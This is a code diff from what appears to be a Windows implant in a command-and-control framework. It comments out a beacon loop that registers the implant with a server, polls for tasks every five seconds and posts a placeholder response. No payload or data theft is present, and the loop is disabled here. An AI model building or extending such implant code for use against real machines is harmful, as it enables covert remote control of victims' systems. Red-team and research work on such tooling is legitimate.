@@ -36,55 +36,55 @@
 #include "lifecycle/comms.h"
 #include "data/msgpack/msgpack.h"
 #include "control/c2.h"
-int temp_loop() {
+// int temp_loop() {
     
-    //note - do a while not registered?
-    //std::string implant_uuid = register_implant();
-    //swithcing to a get with a null uuid
-    nlohmann::json implant_uuid_data = get("00000000-0000-0000-0000-000000000000");
-    //extract implant_uuid from here
-    std::string implant_uuid = implant_uuid_data["implant_uuid"];
-    std::cout << "Implant UUID: " << implant_uuid << std::endl;
+//     //note - do a while not registered?
+//     //std::string implant_uuid = register_implant();
+//     //swithcing to a get with a null uuid
+//     nlohmann::json implant_uuid_data = get("00000000-0000-0000-0000-000000000000");
+//     //extract implant_uuid from here
+//     std::string implant_uuid = implant_uuid_data["implant_uuid"];
+//     std::cout << "Implant UUID: " << implant_uuid << std::endl;
 
-    if (implant_uuid.empty()) {
-        std::cerr << "Failed to register implant. Exiting." << std::endl;
-        return -1;
-    }
+//     if (implant_uuid.empty()) {
+//         std::cerr << "Failed to register implant. Exiting." << std::endl;
+//         return -1;
+//     }
 
-    while (1) {
-        nlohmann::json task_data = get(implant_uuid);
-        std::cout << "AFTER GET" << std::endl;
+//     while (1) {
+//         nlohmann::json task_data = get(implant_uuid);
+//         std::cout << "AFTER GET" << std::endl;
 
-        // [SAFETY CHECK] 
-        // 1. Is the JSON valid (not null)?
-        // 2. Does it contain the task_uuid key?
-        // 3. Is the value actually a string?
-        if (!task_data.is_null() && task_data.contains("task_uuid") && task_data["task_uuid"].is_string())
-        {
-            std::string task_uuid = task_data["task_uuid"];
-            std::cout << "Received Task: " << task_uuid << std::endl;
+//         // [SAFETY CHECK] 
+//         // 1. Is the JSON valid (not null)?
+//         // 2. Does it contain the task_uuid key?
+//         // 3. Is the value actually a string?
+//         if (!task_data.is_null() && task_data.contains("task_uuid") && task_data["task_uuid"].is_string())
+//         {
+//             std::string task_uuid = task_data["task_uuid"];
+//             std::cout << "Received Task: " << task_uuid << std::endl;
 
-            // Execute Actions
-            std::string text_data = "If you see this it means the implant is talking to you";
+//             // Execute Actions
+//             std::string text_data = "If you see this it means the implant is talking to you";
 
-            // Prepare Response
-            std::vector<uint8_t> task_response_as_msgpack;
-            create_task_response(implant_uuid, task_uuid, text_data, task_response_as_msgpack);
+//             // Prepare Response
+//             std::vector<uint8_t> task_response_as_msgpack;
+//             create_task_response(implant_uuid, task_uuid, text_data, task_response_as_msgpack);
 
-            // POST Response
-            post(implant_uuid, text_data, task_uuid); // Note: verify if post needs text_data or the msgpack buffer
-        }
-        else {
-            // This handles cases where:
-            // 1. HTTP_GET failed
-            // 2. Server sent "No Content"
-            std::cout << "No task or failed request. Sleeping..." << std::endl;
-        }
+//             // POST Response
+//             post(implant_uuid, text_data, task_uuid); // Note: verify if post needs text_data or the msgpack buffer
+//         }
+//         else {
+//             // This handles cases where:
+//             // 1. HTTP_GET failed
+//             // 2. Server sent "No Content"
+//             std::cout << "No task or failed request. Sleeping..." << std::endl;
+//         }
 
-        Sleep(5000);
-        //Sleep([[ sleep_time ]])
-    }
-}
+//         Sleep(5000);
+//         //Sleep([[ sleep_time ]])
+//     }
+// }
 
 //int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 //    std::cout << "hello" << std::endl;
